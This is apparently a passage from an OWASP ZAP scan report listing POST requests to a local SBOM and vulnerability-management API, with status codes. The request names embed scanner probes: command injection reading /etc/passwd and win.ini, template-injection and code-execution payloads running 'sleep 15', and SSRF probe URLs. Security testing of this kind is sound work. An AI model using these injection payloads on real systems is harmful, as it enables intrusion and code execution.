  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("cat /etc/passwd")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("gDlfTrthaoYLrSOSfsGcZMQEKOtWGrBJoSbgUphyaZwwOuMGeWEXdKTwGTKNUZFXXpPyheOMDSZqNhBPeplYJRJjvJLqxbVAnpRfPvxpIMCyQtNZAIypTNvKLraEPKMLbmsXSKhXOBsrumNiFmUdSpyAfMelgCkssXkOCPjrjOwyNafigAyWYJGxxGiXCorcsEtCsNaPbMXVynCHcPCJimPwsMdwVSwBLUdEStLfRGlCGQUMRCYVvjJomhgjwMyinWqjbxkbHpxanQHQhrXWUoGUIPqVoDyDUCqmxuRNXoKGoUrouCiSwvXmxTfvsimLDOLXPkXexfpFXVZYaLRFCEYUaElsIADTKAsMiJqrrOSsqpbavkRDRJfqZhWwqRyAlLJyYeisjVSApCuwDdAWMRDNjqLXEREJGjwLInGIAULIsicOtMTUZBDahsYUqHCtTQmgqjHUQNsWTiZUDttVEHhrbkXwfPCLPIpdUZHNamPAltdjcEmAoWcOfEJLHvq)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://\\6178435829869361747.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("https://6178435829869361747%2eowasp%2eorg")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("https://6178435829869361747.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("https://6178435829869361747.owasp.org/?John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("https://\\6178435829869361747.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("response.write(334,949*260,900)")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("system-property('xsl:vendor')/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj 3214*6891 zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj#set($x=8412*3706)${x}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj#{8513*7102}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj${5706*3995}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj<%=6712*3887%>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj<p th:text=\"${9467*2102}\"></p>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{#2640*6907}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{1432*5563}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{@7769*4594}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{@math key=\"6943\" method=\"multiply\" operand=\"6001\"/}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{{12600|add:46860}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{{8620*1908}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{{=2454*8215}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("zj{{print \"6469\" \"9471\"}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("{system(\"sleep 15\")}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/ ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/discover
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/discover`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/discover%3Fforce=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/discover (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/discover%3Fforce=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/discover (force)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/discover/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/discover/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/workspace
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/workspace`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/workspace/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/workspace/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/upload
  * Node Name: `http://host.docker.internal:8000/api/sboms/upload ()(multipart:file,sbom_name,project_id,product_id,sbom_type,sbom_version,product_version,productver,created_by)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/upload%3Fstrict_ntia=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/upload (strict_ntia)(multipart:file,sbom_name,project_id,product_id,sbom_type,sbom_version,product_version,productver,created_by)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/upload/
  * Node Name: `http://host.docker.internal:8000/api/sboms/upload/ ()(multipart:file,sbom_name,project_id,product_id,sbom_type,sbom_version,product_version,productver,created_by)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/pause
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/pause`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/pause/
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/pause/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/resume
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/resume`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/resume/
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/resume/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/run-now
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/run-now`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/run-now/
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/run-now/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants
  * Node Name: `http://host.docker.internal:8000/api/tenants ()({name,slug,external_iam_tenant_id})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/
  * Node Name: `http://host.docker.internal:8000/api/tenants/ ()({name,slug,external_iam_tenant_id})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users ()({"external_iam_user_id":"John Doe","email":zaproxy@example.com,"display_name":"John Doe","role":"John Doe","status":"ACTIVE"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users/
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users/ ()({"external_iam_user_id":"John Doe","email":zaproxy@example.com,"display_name":"John Doe","role":"John Doe","status":"ACTIVE"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials ()({provider_name,label,api_key,base_url,default_model,tier,enabled,is_default,is_fallback,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials ()({provider_name,label,api_key,base_url,default_model,tier,enabled,is_default,is_fallback,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/ ()({provider_name,label,api_key,base_url,default_model,tier,enabled,is_default,is_fallback,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local,max_concurrent,rate_per_minute})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/test
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/test`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/test/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/test/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/test
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/test ()({provider_name,api_key,base_url,default_model,tier,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/test
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/test ()({provider_name,api_key,base_url,default_model,tier,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/test/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/test/ ()({provider_name,api_key,base_url,default_model,tier,cost_per_1k_input_usd,cost_per_1k_output_usd,is_local})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare
  * Node Name: `http://host.docker.internal:8000/api/v1/compare ()({run_a_id,run_b_id})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare
  * Node Name: `http://host.docker.internal:8000/api/v1/compare ()({run_a_id,run_b_id})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/ ()({run_a_id,run_b_id})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key/export
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key/export ()({format})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key/export
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key/export ()({format})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key/export/
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key/export/ ()({format})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/batch
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/batch ()({ids:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/batch
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/batch ()({ids:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/batch/
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/batch/ ()({ids:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `429`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes ()({"provider_name":"John Doe","force_refresh":false,"budget_usd":1.2,"scope":{"severities":["CRITICAL"],"kev_only":false,"fix_available_only":false,"search_query":ZAP,"finding_ids":[10],"label":"John Doe"}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/ ()({"provider_name":"John Doe","force_refresh":false,"budget_usd":1.2,"scope":{"severities":["CRITICAL"],"kev_only":false,"fix_available_only":false,"search_query":ZAP,"finding_ids":[10],"label":"John Doe"}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/cancel
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/cancel`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/cancel/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/cancel/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/cancel
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/cancel`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/cancel/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/cancel/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate ()({"scope":{"severities":["CRITICAL"],"kev_only":false,"fix_available_only":false,"search_query":ZAP,"finding_ids":[10],"label":"John Doe"}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate/ ()({"scope":{"severities":["CRITICAL"],"kev_only":false,"fix_available_only":false,"search_query":ZAP,"finding_ids":[10],"label":"John Doe"}})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/ai/suggest-fixes
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ai/suggest-fixes ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/ai/suggest-fixes/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ai/suggest-fixes/ ()({user_instruction})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch (strict_ntia,verify_signature)({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch (strict_ntia,verify_signature)({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/apply-patch/ ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/import
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/import`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/import%3Fstrict_ntia=false&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/import%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false&project_required=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/import (project_required,strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/import/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/import/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair/patches
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair/patches ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/repair/patches/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/repair/patches/ ()({patches:[{}]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/revalidate/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/validate
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/validate`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/validate%3Fstrict_ntia=false&verify_signature=false
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/validate (strict_ntia,verify_signature)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/validate%3Fstrict_ntia=http%253A%252F%252Fwww.google.com%252F&verify_signature=false
